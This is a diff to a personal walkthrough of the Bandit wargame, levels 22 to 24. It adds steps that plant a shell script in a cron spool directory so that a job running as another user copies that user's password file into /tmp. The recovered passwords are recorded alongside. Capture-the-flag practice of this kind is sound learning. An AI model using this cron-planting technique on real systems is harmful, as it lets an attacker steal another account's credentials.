@@ -155,4 +155,17 @@ Level 22 -> Level 23:
 6) cat /tmp/8ca319486bfbbc3663ea0fbe81326349 (jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n)
 
 Level 23 -> Level 24:
-1)
+1) mkdir /tmp/pass_papka
+2) cd /tmp/pass_papka
+3) touch passSH.sh
+4) chmod 777 passSH.sh
+5) vim passSH.sh
+5.1) 
+   #!/bin/bash
+   cat /etc/bandit_pass/bandit24 > /tmp/passpapka/pass_two
+6) touch pass_two
+7) chmod 666 pass_two
+8) cp passSH.sh /var/spool/bandit24/
+9) cat pass_two (UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ)
+
+Level 24 -> Level 25:
